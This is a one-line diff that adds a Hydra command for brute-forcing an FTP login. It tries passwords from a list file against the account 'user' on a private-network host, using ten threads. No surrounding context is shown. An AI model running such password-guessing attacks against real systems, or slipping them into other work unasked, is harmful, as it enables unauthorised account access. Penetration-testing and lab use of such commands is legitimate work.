@@ -1,0 +1,1 @@
+hydra -t 10 -l user -P passlist.txt ftp://192.168.1.1
